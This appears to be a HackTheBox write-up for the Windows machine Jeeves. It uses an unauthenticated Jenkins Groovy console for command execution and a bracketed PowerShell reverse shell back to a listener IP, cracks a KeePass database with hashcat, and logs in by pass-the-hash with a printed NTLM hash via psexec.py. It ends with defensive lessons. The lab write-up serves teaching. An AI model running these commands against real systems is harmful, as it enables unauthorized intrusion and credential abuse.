---
layout: post
title: "The Butler Kept a Hidden Drawer"
subtitle: "HTB Jeeves, where an unlocked Jenkins hands you a shell, a cracked password manager hands you the keys, and the last flag hides in a seam of the filesystem nobody looks at"
date: 2018-05-26 12:00:00 +0000
description: "An unauthenticated Jenkins console, a KeePass database cracked with rockyou, a hash that logs in without ever becoming a password, and a final flag tucked into an NTFS alternate data stream."
image: /assets/og/the-butler-kept-a-hidden-drawer.png
tags: [hackthebox, writeup]
---

Jeeves is a house run by a butler who never locks anything. The front door is a build server with the authentication ripped out, so you walk in and ask it to run commands and it does, politely, every time. From there you find the butler keeps a little encrypted notebook, and the lock on that notebook is a word out of a leaked password list. Inside is a hash that does not need to be turned back into a password to work. You hand it to the front door of the administrator account and the door opens, because Windows was happy to accept the hash as proof all along. And then the last flag is not on the desk where flags live. It is folded into a seam of the filesystem itself, a hidden drawer built into a file you can already see. Nothing here is forced. Every lock was either left open or made of something you could already read.

```
        J E E V E S
        ===========
        :50000  jenkins, no login.  "run this." → it runs.
                   |
                   v
        a shell as kohsuke, who keeps a notebook (CEH.kdbx)
        locked with a word from rockyou.
                   |
                   v
        the notebook holds a hash, not a password.
        you don't crack it. you just present it.
                   |
                   v
        administrator opens. and the last flag
        hides in a seam of the file, not on the desk.
                                            鍵
```

## 0x01 · the foyer

Four ports answer, and the shape is unmistakably Windows. IIS on 80, the RPC and SMB stack on 135 and 445, and one stranger sitting high up on 50000.

```
PORT      STATE SERVICE  VERSION
80/tcp    open  http     Microsoft IIS httpd 10.0
135/tcp   open  msrpc    Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
50000/tcp open  http     Jetty 9.4.z-SNAPSHOT
```

Port 80 is a dead end, a fake search engine that does nothing. The one worth your attention is 50000. Jetty is the little web server that Java applications carry around inside themselves, and a Java app on a high port whispers one thing louder than the rest. Brute force the directories and the whisper becomes a name.

```
# feroxbuster -u http://10.10.10.63:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
200  GET  /askjeeves
```

`/askjeeves` is a Jenkins instance. Jenkins is a build server, the machine a software team points at their code so it compiles and tests itself automatically. And this one has no login at all. The whole control panel is just sitting there, open to the street.

## 0x02 · a server that runs anything

Jenkins is dangerous the moment you can reach it without a password, because running commands is not a bug in Jenkins. It is the entire purpose of the thing. A build server exists to take instructions and execute them on a machine. Picture a workshop with a sign on the door that says "tell me what to build and I will build it," and someone forgot to put a lock on the door. You do not need an exploit. You need a sentence.

The cleanest path is the Script Console, hidden under Manage Jenkins. It runs Groovy, which is just Java that talks back, and Groovy can shell out to the operating system whenever it likes.

```
"cmd.exe /c whoami".execute().text

jeeves\kohsuke
```

That single line proved the box will run code as the `kohsuke` user. There is a longer way too, building a Freestyle Project with an "Execute Windows batch command" step, which is the same trick wearing a job ticket instead of a console. Either road leads to the same place. Swap the `whoami` for a real payload and a shell drops into your lap.

```
# generate a PowerShell base64 one-liner and feed it through the console
"powershell -enc <base64 of [ powershell reverse shell back to 10.10.14.4 on 443 ]>".execute()

# nc -lvnp 443
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.63]
PS C:\Users\kohsuke\.jenkins> whoami
jeeves\kohsuke
```

I am bracketing the reverse shell on purpose, the same way I would not photograph a key I was about to hand back. The shape matters more than the bytes. It is a PowerShell stub that dials home to a listener, nothing exotic, and you can build it in your sleep.

## 0x03 · the butler's notebook

`kohsuke` is a low-privilege account, so the next move is to look where this user keeps secrets. The Documents folder holds a file that stops you cold.

```
PS C:\Users\kohsuke\Documents> dir
    CEH.kdbx
```

A `.kdbx` file is a KeePass database, an encrypted password manager. Think of it like a small locked notebook where someone wrote down every password they were afraid to forget. The whole notebook is sealed behind a single master password. Crack that one word and every secret inside falls out at once.

Pull the file back to your own machine. The standard move is `keepass2john`, a tool that reads the database header and produces a hash representing the master password, the kind of thing a cracker can chew on.

```
# keepass2john CEH.kdbx > ceh.hash
# hashcat -m 13400 ceh.hash /usr/share/wordlists/rockyou.txt
...
moonshine1
```

The master password is `moonshine1`, a word that sits right there in rockyou.txt, the leaked password list everyone trains against. A password manager is only as strong as the one password guarding it, and this one was guarding the vault with a word a dictionary already knew.

## 0x04 · a key shaped like a hash

Open the notebook with the cracked master password. `kpcli` is a command-line KeePass client that lets you walk the entries.

```
# kpcli --kdb CEH.kdbx
kpcli:/> show -f "Backup stuff"
   Pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

That value is not a password. It is an NTLM hash, the scrambled form Windows stores instead of your real password. And here is the part that surprises people the first time. On Windows, you very often do not need to turn that hash back into the original password to use it. The authentication protocol will accept the hash itself as proof you know the password. This is pass-the-hash, and it is less an exploit than a design decision that aged badly.

Picture a club that checks ID by comparing your face to a sealed photo on file. Pass-the-hash is realizing you never needed to be the person in the photo. You just needed a copy of the photo to hold up. The hash was meant to be a stored secret. It turned out to be a working credential.

So you present it, no cracking required. `crackmapexec` confirms the hash is good against SMB.

```
# crackmapexec smb 10.10.10.63 -u administrator -H e0fb1fb85756c24235ff238cbe81fe00
SMB  10.10.10.63  445  JEEVES  [+] Jeeves\administrator (Pwn3d!)
```

`Pwn3d!` means full access. Now turn that into a shell with `psexec.py` from Impacket, handing it the hash where it expects a password.

```
# psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63
[*] Found writable share ADMIN$
C:\Windows\system32> whoami
nt authority\system
```

You came in as a hash and walked out as SYSTEM, the highest account on a Windows box. The password was never spoken aloud.

## 0x05 · the hidden drawer

The user flag was easy. The root flag is where Jeeves earns its keep. On the administrator desktop sits a file that is almost a taunt.

```
C:\Users\Administrator\Desktop> type hm.txt
The flag is elsewhere.  Look deeper.
```

The flag is not gone. It is hidden inside that very file, in a place a normal directory listing refuses to show you. NTFS, the Windows filesystem, lets a single file carry more than one stream of data. The visible contents are the main stream. But a file can have extra named streams stapled to its side, called alternate data streams, and they do not appear in an ordinary `dir`. Think of it like a manila folder where everyone reads the page in front, while a second page is taped flat against the back cover. Same folder, same name, but you only find the back page if you know to flip it over.

Flip it over with `dir /R`, which is the one switch that reveals the streams.

```
C:\Users\Administrator\Desktop> dir /R
   hm.txt
   hm.txt:root.txt:$DATA
```

There it is, `hm.txt:root.txt`, a whole second file riding inside `hm.txt`. Read the stream directly by naming it after the colon.

```
C:\Users\Administrator\Desktop> more < hm.txt:root.txt
████████████████████████████████
```

And the user flag, for completeness, from when you were `kohsuke`.

```
C:\Users\kohsuke\Desktop> type user.txt
████████████████████████████████
```

## 0x06 · the honest caveat

Nothing on Jeeves is a zero-day, and that is exactly why it lingers. Every step is a default left unguarded. The headline mistake is the Jenkins instance with no authentication, which is not a flaw in Jenkins at all. It is a powerful tool handed to the open internet with its safety off. A build server is a remote-code-execution engine by design, and the only thing standing between that engine and a stranger is the login page somebody decided to skip. To this day, exposed and unauthenticated CI servers are one of the most reliable footholds on a real network, not because the software is broken but because the deployment was rushed.

The KeePass step is the quieter lesson, and it cuts in two directions. A password manager is genuinely good security, right up until its master password is a word from a wordlist. Encryption around a weak secret only buys you the time it takes to run hashcat. And the hash that came out of that vault is the part worth losing sleep over, because pass-the-hash means a stored credential is a live credential. You do not protect against it by choosing a longer password. You protect against it by never letting that hash sit somewhere a low-privilege user can read it.

The alternate data stream at the end is almost a wink, but it carries a real point. Hiding something is not the same as securing it. The flag was readable by anyone who reached SYSTEM. The seam in the filesystem did not protect it. It only delayed the person who did not know the seam was there, and obscurity has never once stopped someone who knew where to look.

## 0x07 · outro

```
the workshop ran your sentence because nobody locked the door.
the notebook fell open because its master word was already on a list.
the hash logged in because it was never asked to become a password.
the last flag hid in a seam, and a seam is not a lock.

four open drawers, one after another, none of them forced.

ask the butler. read the seam. wear black.

                                                            EOF
```

---

*HTB: Jeeves, retired 19 May 2018. A medium Windows box that is really a tour of trust left lying around, an open Jenkins, a weak vault, a hash that walks in like a guest, and a flag folded into the filesystem itself.*